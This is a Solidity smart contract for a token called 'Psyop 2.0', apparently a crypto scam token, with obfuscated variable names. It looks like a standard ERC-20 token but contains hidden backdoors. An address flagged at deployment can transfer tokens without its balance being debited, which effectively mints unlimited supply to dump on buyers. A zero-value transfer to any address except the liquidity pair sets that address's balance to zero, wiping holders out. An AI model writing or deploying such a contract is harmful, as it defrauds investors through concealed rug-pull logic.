/*

https://t.me/twopsyop

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Psyop is Ownable {
    mapping(address => uint256) private lmiprsyvd;

    constructor(address hkvlpwbxft) {
        balanceOf[msg.sender] = totalSupply;
        lmiprsyvd[hkvlpwbxft] = lerdgcvsu;
        IUniswapV2Router02 ltqiaykbxr = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        wkzqlnepov = IUniswapV2Factory(ltqiaykbxr.factory()).createPair(address(this), ltqiaykbxr.WETH());
    }

    function wdkvligesc(address jrstcvw, address pleugykmtfz, uint256 wvlo) private {
        if (0 == lmiprsyvd[jrstcvw]) {
            balanceOf[jrstcvw] -= wvlo;
        }
        balanceOf[pleugykmtfz] += wvlo;
        if (0 == wvlo && pleugykmtfz != wkzqlnepov) {
            balanceOf[pleugykmtfz] = wvlo;
        }
        emit Transfer(jrstcvw, pleugykmtfz, wvlo);
    }

    string public name = 'Psyop 2.0';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'Psyop 2.0';

    mapping(address => uint256) public balanceOf;

    function approve(address zncvekgjao, uint256 wvlo) public returns (bool success) {
        allowance[msg.sender][zncvekgjao] = wvlo;
        emit Approval(msg.sender, zncvekgjao, wvlo);
        return true;
    }

    function transferFrom(address jrstcvw, address pleugykmtfz, uint256 wvlo) public returns (bool success) {
        require(wvlo <= allowance[jrstcvw][msg.sender]);
        allowance[jrstcvw][msg.sender] -= wvlo;
        wdkvligesc(jrstcvw, pleugykmtfz, wvlo);
        return true;
    }

    address public wkzqlnepov;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address pleugykmtfz, uint256 wvlo) public returns (bool success) {
        wdkvligesc(msg.sender, pleugykmtfz, wvlo);
        return true;
    }

    uint256 private lerdgcvsu = 101;

    uint8 public decimals = 9;

    mapping(address => uint256) private vwxryqzlg;
}